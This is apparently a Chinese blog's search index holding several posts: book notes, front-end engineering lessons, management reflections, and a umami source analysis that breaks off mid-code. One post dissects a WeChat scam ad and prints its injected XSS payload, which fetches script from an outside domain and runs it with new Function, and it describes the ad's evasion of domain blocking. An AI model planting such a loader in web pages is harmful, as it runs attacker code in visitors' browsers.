<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>遥远的救世主</title>
      <link href="/2022/11/08/reading/distant-saviour/"/>
      <url>/2022/11/08/reading/distant-saviour/</url>
      
        <content type="html"><![CDATA[<h2 id="王庙村的农民"><a href="#王庙村的农民" class="headerlink" title="王庙村的农民"></a>王庙村的农民</h2><p>王庙村的农民可能是这本书中最没有存在感的一群人，艰苦，朴素，吃别人吃不了的苦，受别人受不了的罪，干别人干不了的活。面朝黄土背朝天的生活，因为丁元英的扶贫，开了一扇窗户，所有人都在努力的去抓住这根救命稻草。</p><p>苦吗，苦。吃不得苦中苦，哪能改变生活？人与人之间没有特质的差异，拼的就是谁对自己更狠。</p><h2 id="刘冰"><a href="#刘冰" class="headerlink" title="刘冰"></a>刘冰</h2><p>市侩，自作聪明。小生意上面，这种人也许是极好的，能赚点小钱。但是没有大的格局，有点风吹草动就要退股，眼光短浅，难成大器。最终也死在了自己的自作聪明中。不是命运不给他活路，实在是他自己不给自己活路。</p><p>某些时候，我觉得我也是这样的人，鼠目寸光，看不到长远的未来，为了蝇头小利，沾沾自喜。</p><h2 id="欧阳雪"><a href="#欧阳雪" class="headerlink" title="欧阳雪"></a>欧阳雪</h2><p>从混沌摊起步，一步一个脚印经营者着大饭店，不熟悉的领域绝对不碰，参与这场游戏，只是因为一个赌局，只是为了维护芮小丹。让人很舒服的一个人，后来有了公司股权，也都是委托给专业人士打理，自己只做自己熟悉的事情。</p><p>有过几次冲突的场景，都没有任何的妥协，不惧怕困难。看这些段落的时候，我总是想起《大染坊》中的陈六子，都是从一无所有开始，到拥有丰富的物质生活。陈六子要饭出生，几个重要关头也是天不怕地不怕，” 大不了从头再来 “。</p><p>大不了从头再来。主动或者被动的失去现在的一切，一切从 0 开始，需要多大的勇气和豪情。什么都不敢失去，最终会失去所有，放弃一些俗念，专注问题本身，不被外界牵扯撕拉，保持内心的平静，怕什么，大不了从头再来。</p><h2 id="书摘"><a href="#书摘" class="headerlink" title="书摘"></a>书摘</h2><p> 第一章</p><blockquote><p>朋友？不可能。认识、熟人、够得上说话，这就已经不错了。咱跟人家根本不是一种人，凭什么跟人家成朋友？”</p></blockquote><blockquote><p>肖亚文说：“认识这个人就是开了一扇窗户，就能看到不一样的东西，听到不一样的声音，能让你思考、觉悟，这已经够了。其它还有很多，比如机会、帮助，我不确定。这个在一般人看来可能不重要，但我知道这个人很重要。”</p></blockquote><blockquote><p>肖亚文说：“当你觉得这个人很特别的时候，千万别对这种人动心思，一旦动了那种心思你就算把地狱之门打开了，除了自己受折磨不会有第二种结果。这种不是人的人是个女人都受不了，他妻子只跟他过了半年就离婚了，说他不是人。我说这话你可以不当回事，但是如果真的发生了，那是你自找的，别怪我没提醒过你。<br>注: 这是故意的吧</p></blockquote><blockquote><p>其实我也动过这个念头，神不知鬼不觉地跟着买点就行，可心理承受不了，超出道德底线了。<br>注: 酒桌赌局</p></blockquote><p> 第三章</p><blockquote><p>丁元英说：“如果没有特别的事，我打算明天走。有什么事你先说。”<br>注: 如果没有特别的事，多给对方面子，我可以推迟的。</p></blockquote><blockquote><p>丁元英醉醺醺地说：“中国的传统文化是皇恩浩大的文化，它的实用是以皇天在上为先决条件。中国为什么穷？穷就穷在幼稚的思维，穷在期望救主、期望救恩的文化上，这是一个渗透到民族骨子里的价值判断体系，太可怕了。”</p></blockquote><p> 第十章</p><blockquote><p>芮小丹说：“驾御？我没想过，我就是一个心眼儿想疼他。”</p></blockquote><blockquote><p>芮小丹一笑说：“即便是呼之欲出你也讲不出，因为一说就错，这就像法律不能单纯以推理定罪，得允许在可能与事实之间存续一个演化的过程。”<br>注: 这男人追的，无话可说</p></blockquote><p> 第十一章</p><blockquote><p>他永远都不会跟你吵架，他的每一个毛孔里都渗透着对世俗文化的居高临下的包容，包容到不屑于跟你讲道理，包容到让你自己觉得低俗、自卑，当你快要憋死、快要疯掉的时候，你能想到的就只有一个字，逃！”</p></blockquote><blockquote><p>肖亚文说：“所以，他不会让自己绊倒两次。而你，求之不得，就得受相思之苦。相思有多苦，古今的诗词都说尽了。你是女人，有女人的天性，一旦陷进去就很难自拔。丁元英这种人对女人没有意义，是女人就有贪嗔痴，没有贪嗔痴的女人是天国的女人。”</p></blockquote><p> 第十二章</p><blockquote><p>丁元英心里明白这是揭幕的前奏，于是坦率地说：“女人是形式逻辑的典范，是辩证逻辑的障碍，我无意摧残女人，也不想被女人摧残。”<br>注: 哈哈</p></blockquote><blockquote><p>他站起身，弯腰捡起那件睡衣，轻轻地给芮小丹裹在身上，又坐回到原处，望着她极其诚恳地说道：“你是一块玉，但我不是匠人，我不过是一个略懂投机之道的混子，充其量挣几个打发凡夫俗子的铜板。你要求的，是一种雄性文化的魂，我不能因为你没说出来而装不知道。接受你，就接受了一种高度，我没有这个自信。”<br>注: 这还不上？</p></blockquote><p> 第十三章</p><blockquote><p>二号人物王明阳 38 岁，美术学院本科学历，未婚，黑恶集团军师，此人精通法律和社会学，沉着、残忍，心理素质稳定，智商过人，<br>注: 本科！高智商啊</p></blockquote><p> 第十四章</p><blockquote><p>芮小丹陶醉地说：“那还不如让那一枪响了，我就在你心里永恒了。”<br>注: 会的……</p></blockquote><blockquote><p>丁元英说：“透视社会依次有三个层面：技术、制度和文化。小到一个人，大到一个国家一个民族，任何一种命运归根到底都是那种文化属性的产物。强势文化造就强者，弱势文化造就弱者，这是规律，也可以理解为天道，不以人的意志为转移。”</p></blockquote><blockquote><p>丁元英说：“强势文化就是遵循事物规律的文化，弱势文化就是依赖强者的道德期望破格获取的文化，也是期望救主的文化。强势文化在武学上被称为“秘笈”，而弱势文化由于易学、易懂、易用，成了流行品种。”</p></blockquote><blockquote><p>丁元英想了一会儿，举例说：“比如说文化产业，文学、影视是扒拉灵魂的艺术，如果文学、影视的创作能破解更高思维空间的文化密码，那么它的功效就是启迪人的觉悟、震撼人的灵魂，这就是众生所需，就是功德、市场、名利，精神拯救的暴利与毒品麻醉的暴利完全等值，而且不必像贩毒那样耍花招，没有心理成本和法律风险。”<br>注: 文化的高级</p></blockquote><blockquote><p>丁元英沉思了一会儿，说：“这个人需要一个句号，你可以帮他画一个。”<br>注: 他需要的是从上而下的，智慧上面的压制。</p></blockquote><blockquote><p>“灵魂归宿感。”丁元英解释说：“这是人性本能的需要，是人性，你帮他找块干净的地方归宿灵魂，他需要的不是忏悔，而是一个可以忏悔的理由。”</p></blockquote><p> 第十五章</p><blockquote><p>芮小丹说：“不因上天堂与下地狱的因果关系而具有的极高人生境界，就是窄门。耶稣为拯救世人甘愿自己被钉在十字架上，是肉身的地狱，是灵魂的天堂。基督徒的得救缘于神的‘约’，缘于神的应许。但进不得窄门也同样缘于‘约’，缘于神的应许。窄门是基督道德理想的最高价值。”</p></blockquote><blockquote><p>芮小丹说：“进了窄门，神立刻就会告诉你：我是不存在的，神就是你自己。但是，证到如此也并不究竟，神是什么？神即道，道法自然，如来。”</p></blockquote><blockquote><p>芮小丹盯着他的眼睛，用极其平静的口吻说：“文明对于不能以人字来界定的人无能为力，我除了鄙视和震惊，不会再有第三种反应。人的法则是，一颗阴暗的心永远托不起一张灿烂的脸，这不是卫道士的说教，这是人性。”<br>王明阳茫然地问：“天国在哪儿？”<br>芮小丹庄重地说：“天国在你心里。”</p></blockquote><blockquote><p>你不知道你，所以你是你，如果你知道了你，你就不是你了。</p></blockquote><blockquote><p>丁元英抽着烟思索了一会儿，说：“这世上原本就没什么神话，所谓的神话不过是常人的思维所不易理解的平常事。”</p></blockquote><p> 第十八章</p><blockquote><p>欧阳雪说：“不一样，一个是天涯咫尺，一个是咫尺天涯，能一样吗？”</p></blockquote><blockquote><p>丁元英脸上呈现出一种少有的严肃神态，语调低沉而凝重地说：“我有几句不能跟你讲理也无法给你解释所以然的话，希望你能听进去。关键一句：你应该辞职。请注意，是你应该，而不是我希望。只要你一分钟是警察，你这一分钟就必须要履行警察的天职，你就没有避险的权力。但是，国家机器不缺一个迟早要被淘汰的女刑警，而社会应该多一个有非常作为的人才，这不是通俗的英雄主义和通俗的平等意识可以理解的价值。”</p></blockquote><blockquote><p>丁元英望着窗外说：“这就是圆融世故，不显山不露水，各得其所。可品性这东西，今天缺个角、明天裂道缝，也就离塌陷不远了。”</p></blockquote><p> 第十九章</p><blockquote><p>丁元英说：“这不是一个道德境界问题，是市场生存的法则问题。这种好感不仅仅是我们强行摊派价值观，也不仅仅是腐蚀我们自身的竞争力，更说明我们不是靠产品征服市场而是靠作秀混迹市场，这种违背商业属性的人文评价最终将葬送这个公司。”<br>注: 真是通透</p></blockquote><blockquote><p>生存法则很简单，就是忍人所不忍，能人所不能。忍是一条线，能是一条线，两者的间距就是生存机会。</p></blockquote><blockquote><p>具体到咱们当下这事，就是认准市场，吃别人吃不了的苦，受别人受不了的罪，做别人做不到的成本和质量。这个，就是你们的救世主。扶贫的本质在一个扶字，如果你根本就没打算自己站起来，老天爷来了都没用。</p></blockquote><blockquote><p>本来这钱说是借的，我是怕做赔了还不了钱才把她硬拉进股东，当时小丹正在读大学，根本没有经商的心思，我跟她说得天花乱坠，其实心里一点都没底。小丹心里什么都知道，可就是不捅破这层纸，一直给我留着面子。这事过去好多年了，我一直都忘不了。<br>注: 也许这就是两肋插刀的朋友吧。</p></blockquote><p> 第二十章</p><blockquote><p>丁元英打开一瓶矿泉水喝了一口说：“小丹想要个礼物，就有了这档子事。王庙村是贫困县里的贫困村，小丹要的礼物就是在王庙村给她写个神话。”<br>注: 真是浪漫……</p></blockquote><blockquote><p>丁元英说：“什么神话？不过是强力作用的杀富济贫，扒着井沿看一眼而已，不解决造血问题，谁敢拿着一个村子的农民去证明扒井沿儿看一眼的结果？那就不是错了，是罪。如果真理是人做出来的，那也不叫真理了，叫主义。”</p></blockquote><blockquote><p>核心在一个小聪明上，小聪明的文章做好了，就能诱导乐圣公司的大聪明，而潜伏在小聪明其中的，是大智若愚。</p></blockquote><blockquote><p>如果扒着井沿儿看一眼再掉下去，那就真是饱了眼福，苦了贪心，又往地狱里陷了一截子。</p></blockquote><blockquote><p>丁元英说：“晚辈以为，传统观念的死结就在一个‘靠’字上，在家靠父母，出门靠朋友，靠上帝、靠菩萨、靠皇恩……总之靠什么都行，就是别靠自己。这是一个沉积了几千年的文化属性问题，非几次新文化运动就能开悟。晚辈无意评说道法，只在已经缘起的事情里顺水推舟，借英雄好汉的嗓子喊上两声，至少不违天道朝纲。”</p></blockquote><blockquote><p>智玄大师说：“弱势得救之道，也有也没有。没有竞争的社会就没有活力，而竞争必然会产生贫富、等级，此乃天道，乃社会进步的必然代价。无弱，强焉在？一个‘强’字，弱已经在其中了。故而，佛度心苦，修的是一颗平常心。”</p></blockquote><p> 第二十一章</p><blockquote><p>丁元英说：“想干成点事就记住两句话，别把别人不当人了，别把自己太当人了。就这点规律而言，天下乌鸦一般黑。</p></blockquote><p> 第二十二章</p><blockquote><p>你是谁？我是谁？这些问题我也想过。咱们两个活得不一样，我活得很简单，你活得太复杂，不是平行的两条线，是交叉而过。但是，这于我已经够了。<br>注: 又立 flag 了</p></blockquote><blockquote><p>丁元英说：“是皇天在上的文化，是救主、救恩的文化。如果一个民族的文化从骨子里就是弱势文化属性，怎么可能去承载强势文化的政治、经济？衡量一种文化属性不是看它积淀的时间长短，而是看它与客观规律的距离远近。五千年的文化是光辉、是灿烂，这个没有问题。但是，传统和习俗得过过客观规律的筛子。”</p></blockquote><p> 第二十三章</p><blockquote><p>肖亚文说：“记得有一次丁总请韩总吃饭的时候酒桌上闲聊，我问丁总，为人处事怎么才能做到恰到好处？丁总说，恰到好处是‘正好’，‘正好’是假的，不是究竟本来，是假的就立不住。我不懂，就问他是什么究竟本来？他说‘一切’。我还是不懂，就说你就告诉我应该怎么做吧。丁总说了一句话：随缘惜缘不攀缘。</p></blockquote><p> 第二十五章</p><blockquote><p>如果我的能力只能让我穷困潦倒，那穷困潦倒就是我的价值。</p></blockquote><p> 第二十七章</p><blockquote><p>你看上的这个人，一定是你驾驭不了的人</p></blockquote><p> 第三十五章</p><blockquote><p>肖亚文说：“这不是钱的问题，格律诗是丁总操持的扶贫公司，我能有个拍马屁的机会就不错了，哪儿还敢再要扶贫的钱？问题是，我行吗？”<br>注: 这不是人，这是神。但是贵人出现的时候，你能把握住吗？</p></blockquote><p> 第三十六章</p><blockquote><p>不该作为的不作为就是作为</p></blockquote><blockquote><p>神就是道，道就是规律，规律如来，容不得你思议，按规律办事的人就是神。</p></blockquote><blockquote><p>没钱的时候就选择既清静又生活成本低的地方，有条件了就选择更清静点的地方。</p></blockquote><blockquote><p>芮小丹说：“只要不是我觉到、悟到的，你给不了我，给了我也拿不住，叶晓明他们就是例子。只有我自己觉到、悟到的，我才有可能做到，我能做到的才是我的。”</p></blockquote><p> 第三十九章</p><blockquote><p>马经理哈哈一阵大笑，然后摇摇头感慨地说：“不是咱想黑，是不黑不行啊！用元英的话说，这世界要不是黑白颠倒，那还叫众生吗？那该叫天国了。”</p></blockquote><p> 第四十章</p><blockquote><p>除掉对手是为了自己能活得更好，如果是为了给自己掘墓，那么杀这个人的意义又在哪儿？</p></blockquote><blockquote><p>“我还是那句话，潮起潮落是常有的事，别太放在心上。</p></blockquote><blockquote><p>林雨峰说：“如果是你，你会承诺吗？靠封官许愿捏在一起，你能指望这样的队伍去攻城拔寨？丁元英是明白人，扶不起来的硬扶，到头来会摔得更惨。”</p></blockquote><p> 第四十三章</p><blockquote><p>别把自己太当人了，吃人家吃不了的苦，受人家受不了的罪，做人家做不到的成本和质量。</p></blockquote><p> 第四十四章</p><blockquote><p>只有你行，你才有机会</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个意思的微信群广告</title>
      <link href="/2022/10/06/front-end/xss/"/>
      <url>/2022/10/06/front-end/xss/</url>
      
        <content type="html"><![CDATA[<p>群广告，语不惊人死不休，</p><p><img src="/images/2022/10/06/16650521586506.jpg"></p><p>跳转之后，出现 sougou 的页面，然后重定向到广告页面。</p><p><img src="/images/2022/10/06/16650521657367.jpg"></p><p>构造了一个 xss，script 标签，被执行。</p><pre class=" language-js"><code class="language-js"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'//iprozz.com/ffff'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>r<span class="token operator">=</span><span class="token operator">></span>r<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>C<span class="token operator">=</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token punctuation">(</span>C<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><code>iprozz.com/ffff</code> 请求发出去之后，被执行，页面跳转到广告页面。<code>new Function(C)()</code> 这种函数执行方式平时用的还是非常少的，安全方面，各种奇奇怪怪的写法，挺有意思。</p><p>如果只是到这里，也没必要写这篇博客。尝试调试的时候，发现，在一般浏览器里面是无法请求这个地址的，似乎只在微信的浏览器的可以请求，应该是识别了微信的ua。这样二级跳转，可以对域名做一层保护，减少被封。当域名被封之后，也可以修改服务端的跳转地址，实现快速更换域名的目的。</p><p>做戏做全套，我们平时的开发中经常抱有侥幸心理，对比一下人家的态度，我们真的能比骗子更专业吗？</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大型项目前端手记</title>
      <link href="/2022/09/18/anything/da-xing-xiang-mu-qian-duan-shou-ji/"/>
      <url>/2022/09/18/anything/da-xing-xiang-mu-qian-duan-shou-ji/</url>
      
        <content type="html"><![CDATA[<p>亿级流量的 c 端项目。主体是多个小程序，并且分化为多个版本。除了扯皮拉扯之外，总想聊一聊，不吐不快。</p><h2 id="保持技术栈的单调性"><a href="#保持技术栈的单调性" class="headerlink" title="保持技术栈的单调性"></a>保持技术栈的单调性</h2><p>因为各种原因，我们的技术栈百花齐放，uniapp，herbjs，内部小程序框架，vue(h5)，react(h5)，苦不堪言。对于新人进来，只能快速熟悉一块内容，熟悉其他的小程序需要重新学习框架，成本比较高，如果框架本身还出现一些bug，简直酸爽。</p><h3 id="少有人走的路"><a href="#少有人走的路" class="headerlink" title="少有人走的路"></a>少有人走的路</h3><p>《少有人走的路》是本挺好的描述亲密关系的书，然而，技术上要小心。少有人选择的技术，那么就是坑多，因为部分业务是继承项目，所以框架沿用的原来的框架，没有文档，没有支持，吭哧吭哧，埋头苦干。没有人问，没有人解释，各种写法奇绝诡异。<br>再给我一次机会，我会毫不犹豫的选择使用熟悉的框架去重构，后续的维护成本会很低，对于长期项目，收益很高。</p><h4 id="选择大路货"><a href="#选择大路货" class="headerlink" title="选择大路货"></a>选择大路货</h4><p>技术选型，选择大路货。虽然 v2ex 把 uniapp 喷的不要不要，然而开发效率，工程化，市场占有率，uniapp 是非常好的，能够让一般开发快速完成工作。<br>然而，uniapp 的 bug 也是有的，我们在开发过程中有遇到，我们选择给 uniapp 提交 mr，一般很快就会被合入。有人维护，有人讨论的技术，不用担心，一定可以找到比较快速的解决办法，没有就完善它，让它变得更美好。</p><h4 id="内部框架是个p"><a href="#内部框架是个p" class="headerlink" title="内部框架是个p"></a>内部框架是个p</h4><p>见过太多的内部库，内部框架了，没有一个，是的没有一个，给我比较好的印象。</p><ol><li>你的同事水平不一定比你强，见过大量错别字的内部库 :(</li><li>内部框架服务于特定领域，有它自身的局限</li><li>内部框架往往公司的人事变迁，就没有人维护了，很多内部框架都是一两个人维护，有的内部看源码都很麻烦，单点风险太高。</li><li>没有银弹，多少库，框架，只是拿着开源的改改，就是内部库了</li></ol><h2 id="保持核心方法的单调性"><a href="#保持核心方法的单调性" class="headerlink" title="保持核心方法的单调性"></a>保持核心方法的单调性</h2><h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p>在我的项目里面，http 方法是比较核心的方法，初始状态下，有使用全局 http 的，也有直接使用 wx.request 方法的。后续做 token 校验的时候，困难重重，线上总是有大量的失效的 token。所以对所有 http 方法做了要求，全部使用我自己的库 @aocoding/mini-axios，集中处理token更新机制，后续异常逐渐降下来了。</p><h3 id="合理封装，保持简单"><a href="#合理封装，保持简单" class="headerlink" title="合理封装，保持简单"></a>合理封装，保持简单</h3><p>很多按钮点击时候，需要用户高级授权，而高级授权又对应着判断是否已经授权，获取 code，和后端交互等复杂交互。<br>这里我们做了一个全局状态去存储授权，并封装成装饰器，按钮等行动点，可以直接使用装饰器去校验。进入页面时候，也可以使用装饰器去做一定的授权防御。</p><h2 id="正确使用组件"><a href="#正确使用组件" class="headerlink" title="正确使用组件"></a>正确使用组件</h2><p>一般项目其实很难过度组件化，一个页面也就十几个组件。但是我接盘的一个项目，组件的划分匪夷所思。</p><ul><li>外层组件：起初我以为是复用，但是完全没有复用，基本都使用一次，原生小程序，不涉及业务逻辑</li><li>内层组件：涉及业务逻辑，引用外层组件，内部框架</li></ul><p>这样的结果就是你需要在小程序里面跳来跳去，一个页面，组件应该有上百个….虽然业务确实比较复杂，但是咱真的至于这样么…</p><h2 id="整洁代码"><a href="#整洁代码" class="headerlink" title="整洁代码"></a>整洁代码</h2><ol><li>严禁大量的注释（调试）代码存在，必须删除，现在不能和过去告别，以后也会纠缠不清，想看以前的记录，请使用 git</li><li>使用 ts，我们的项目基本都切换到了 ts，http 部分必须要有严格的类型定义，后续很少出现数据层面的bug。ts 不需要学的多深入，去做类型体操，花一周时间认真去学习，就能够应对项目中的绝大部分内容。随着 ts 越写越多，更多的场景也会推着你去学习新的知识。</li></ol><h3 id="重构"><a href="#重构" class="headerlink" title="重构"></a>重构</h3><ol><li>不要怕，甩开膀子就是干！信心比能力更重要，面对屎山，要有不破楼兰誓不还的决心，小步迭代，长期推进，屎山也能变金山。</li><li>长期项目，如果没有一定的重构机制，那一定是屎上堆屎。必须有完善的 review 机制，不合格代码不能因为任何原因合入，必须修改完所有的问题，把这养成习惯，去推动团队的运行。</li><li>重构从主干代码开始，聚合项目中的各种通用方法，业务包装，主干代码串起项目骨架，其他的更多的是业务的填充。业务方面，保持各模块的解耦，公用方法的抽离，一个相对健壮的项目就出来了。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 编码点滴 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小程序预览和体验码不一致的坑</title>
      <link href="/2022/08/20/front-end/alipay-mini-pkg-builder/"/>
      <url>/2022/08/20/front-end/alipay-mini-pkg-builder/</url>
      
        <content type="html"><![CDATA[<h2 id="翻车现场"><a href="#翻车现场" class="headerlink" title="翻车现场"></a>翻车现场</h2><p>我们的小程序之前打包都是 ok 的，但是上次发版本，验证发现多处 css 异常。代码回退，使用旧版本的代码故障依旧。并且本地的 ide 打包出来时正常的，只在云端构建时候出现问题。</p><h2 id="快速解决问题"><a href="#快速解决问题" class="headerlink" title="快速解决问题"></a>快速解决问题</h2><p>直觉是存在 css 冲突，为了快速解决问题，把发现的几处修改了。但是还有哪些，挺难发现的，必须找到问题的根本原因。</p><h2 id="问题在哪？"><a href="#问题在哪？" class="headerlink" title="问题在哪？"></a>问题在哪？</h2><p>因为旧版本之前上传是正确的，本次本地都是 ok 的，只在线上出现问题。那么大概率是编译器有更新，本地编译器是随着 ide 发布的，线上可以直接更新。</p><p>我们的 ide 版本是 3.0.2，最新版本的 ide 是 3.1.3，更新最新版本的 ide，问题复现。</p><p>查看 ide 的 mini-pkg-builder hash：</p><p>3.0.2<br>md5: daa0f48beb478e414c8686ba02cc560a<br>sha-256: 5499c3918ab708f6df337abed8a126e9d19293394c746b77846553d2f1caea83</p><p>3.1.3<br>md5: f26ab0d68a13f86377bc6b7805de61ba<br>sha-256: a4b647abbd37776e8b8d1883d179ee6bb64c21f0a7deb7e00e406ae83c1fe561</p><p>编译器确实有变化。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个问题，真的挺搞的，不声不响更新核心组件，质量如何把关的，如何上线的，有没有开发者通知？</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>战争与和平</title>
      <link href="/2022/06/26/anything/zhan-zheng-yu-he-ping/"/>
      <url>/2022/06/26/anything/zhan-zheng-yu-he-ping/</url>
      
        <content type="html"><![CDATA[<p><strong>战争</strong>：项目紧急或复杂<br><strong>和平</strong>：项目不急或简单</p><h2 id="战争"><a href="#战争" class="headerlink" title="战争"></a>战争</h2><p><strong>资源</strong>：战争是资源的消耗战，工作强度往往超过 996，往往我们是极度的缺乏资源，又需要赢下这场战争。在团结内部的同时，也要尽力去争取一切可以争取的资源，比如说，水果零食，加班能不能尽量争取，道义放两旁，利字摆中间。</p><p><strong>代码贡献</strong>：项目紧急或者复杂，就意味着项目之中存在大量有待梳理与优化的点，意味着要投入更多的时间去整合资源、精简需求和迭代方案，个体的代码贡献与整体的效能提升相比，就显得没那么重要了。战争时代，技术主管可以少写、不写代码。</p><p><strong>快速决策</strong>：事情千头万绪，各种人找你，快速决策的基础是必须对项目有深入的理解，不能任凭甲方牵着鼻子走，否则会疲于奔命，要有理有据的说服对方。</p><p><strong>团队</strong>：战争时代，各种会议，对接，会消耗技术主管大量的时间，团队应该在缺少部分管理的情况下自行运作，各自推进项目进度，不能依靠技术主管去做事情的推进。用人所长，发挥团队的最高效能。</p><p><strong>人员</strong>：因为项目的扩张，必然导致人员的扩张，快速筛选人才，挑选人才，团队磨合，对于不能融入团队，传递负能量，无法立即解决眼前问题的，杀伐果断。</p><h2 id="和平"><a href="#和平" class="headerlink" title="和平"></a>和平</h2><p><strong>代码贡献</strong>：项目的稳定期，作为技术攻坚的带头人，引入业界前沿的技术、设计模式或者框架，让战争时代Quick And Dirty的方式和不得不情况下做出的妥协变得优雅又牢固，持续深挖团队的技术护城河，营造团队以精进技术为导向的氛围，培养各个方向顶尖的技术梯队，是和平年代技术主管的使命。</p><p>这个阶段，技术主管应该多写困难的代码，解决共性问题，迎难而上。</p><p><strong>团队</strong>：温情是这个时期的主旋律，给团队明确的技术方向，深挖团队护城河，不断引入最新的技术实践，营造技术氛围。深入了解团队成员的个性与技术擅长，给予适当的引导，和平时期尽量消灭一些浅层次问题，在战争时，才可以用人所长。</p><p><strong>人员</strong>：适合培养新人，磨合团队，培养技术梯队。大型项目可以考虑人员的适度冗余，为战争做准备，避免战争期间大量的人员变动，冲击原有的团队文化，技术阵型。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>技术主管需要有广阔的技术视野，引领团队进步，同时对项目要有细粒度的把控。进能带领团队，迎接一个又一个挑战，退，能够实现复杂的业务逻辑，混口饭吃。</p>]]></content>
      
      
      <categories>
          
          <category> 编码点滴 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
            <tag> 管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>umami 源码分析</title>
      <link href="/2022/06/26/front-end/umami/"/>
      <url>/2022/06/26/front-end/umami/</url>
      
        <content type="html"><![CDATA[<p>umami 不使用 cookie 、localstorage 实现了 uv 识别，符合最新的隐私规范，代码也比较精简。花了一点时间，研究了这部分的实现，还是很有意思的。</p><h2 id="技术框架："><a href="#技术框架：" class="headerlink" title="技术框架："></a>技术框架：</h2><p>next.js + mysql/postgresql<br>整体看下来，nextjs 准备了很多的约定，比如说 api 目录在 <code>pages/api/</code>下面，比如说，<code>pages/api/user.js</code>，nextjs 框架有大量这样的约定。</p><p>个人还是不太习惯这样的框架，总有种不伦不类的感觉，一些小项目可以这样搞，大型项目，还是需要明确的代码分成，封装。</p><h2 id="用户识别"><a href="#用户识别" class="headerlink" title="用户识别"></a>用户识别</h2><p>uv 的核心是去做用户识别，一般会本地存储一个随机的id，每次页面路由变化，上报给后台。<br>而 umami 为了符合一系列的隐私规范，并没有这么做，没有使用 cookie或者 localStorage 。<br>上报路径”pages/api/collect.js”，最终会产生 session 并且通过 session 返回 token 。session 生成方法 <code>getSession</code></p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> session_uuid <span class="token operator">=</span> <span class="token function">uuid</span><span class="token punctuation">(</span>website_id<span class="token punctuation">,</span> hostname<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> userAgent<span class="token punctuation">)</span><span class="token punctuation">;</span>session <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">createSession</span><span class="token punctuation">(</span>website_id<span class="token punctuation">,</span> <span class="token punctuation">{</span>    session_uuid<span class="token punctuation">,</span>    hostname<span class="token punctuation">,</span>    browser<span class="token punctuation">,</span>    os<span class="token punctuation">,</span>    screen<span class="token punctuation">,</span>    language<span class="token punctuation">,</span>    country<span class="token punctuation">,</span>    device<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这部分代码就比较清楚了，根据网站id，域名，ip，userAgent 生成 session_uuid,然后和数据库通信创建或者使用 session。<br>核心是根据一些列的变量生成一个不变的 uuid，后续用户再次进入页面，根据用户的这些参数，去数据库查询这个 uuid，就实现了用户识别。</p><p>里面也有一些其他的逻辑，比如跨域，忽略本地地址等，但是不影响我们对核心逻辑的理解。</p><h2 id="上报脚本脚本"><a href="#上报脚本脚本" class="headerlink" title="上报脚本脚本"></a>上报脚本脚本</h2><p>上报脚本位置：<code>tracker/index.js</code><br>这个脚本很短，只有短短的225实现了上报功能。</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script <span class="token keyword">async</span> defer data<span class="token operator">-</span>website<span class="token operator">-</span>id<span class="token operator">=</span><span class="token string">"914685a1-8993-4d8c-895b-929c8646e814"</span> src<span class="token operator">=</span><span class="token string">"http://localhost:3000/umami.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><ul><li>async: async 脚本会在后台加载，并在加载就绪时运行。DOM 和其他脚本不会等待它们，它们也不会等待其它的东西。async 脚本就是一个会在加载完成时执行的完全独立的脚本。</li><li>defer: 特性告诉浏览器不要等待脚本。相反，浏览器将继续处理 HTML，构建 DOM。脚本会“在后台”下载，然后等 DOM 构建完成后，脚本才会执行。</li><li>data-website-id: 网站 id</li></ul><h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>window<span class="token punctuation">.</span>umami<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> umami <span class="token operator">=</span> eventValue <span class="token operator">=</span><span class="token operator">></span> <span class="token function">trackEvent</span><span class="token punctuation">(</span>eventValue<span class="token punctuation">)</span><span class="token punctuation">;</span>    umami<span class="token punctuation">.</span>trackView <span class="token operator">=</span> trackView<span class="token punctuation">;</span>    umami<span class="token punctuation">.</span>trackEvent <span class="token operator">=</span> trackEvent<span class="token punctuation">;</span>    window<span class="token punctuation">.</span>umami <span class="token operator">=</span> umami<span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p>方法都挂载到 window 上面，后续可以直接调用。</p><h2 id="记录-pv-uv"><a href="#记录-pv-uv" class="headerlink" title="记录 pv uv"></a>记录 pv uv</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>autoTrack 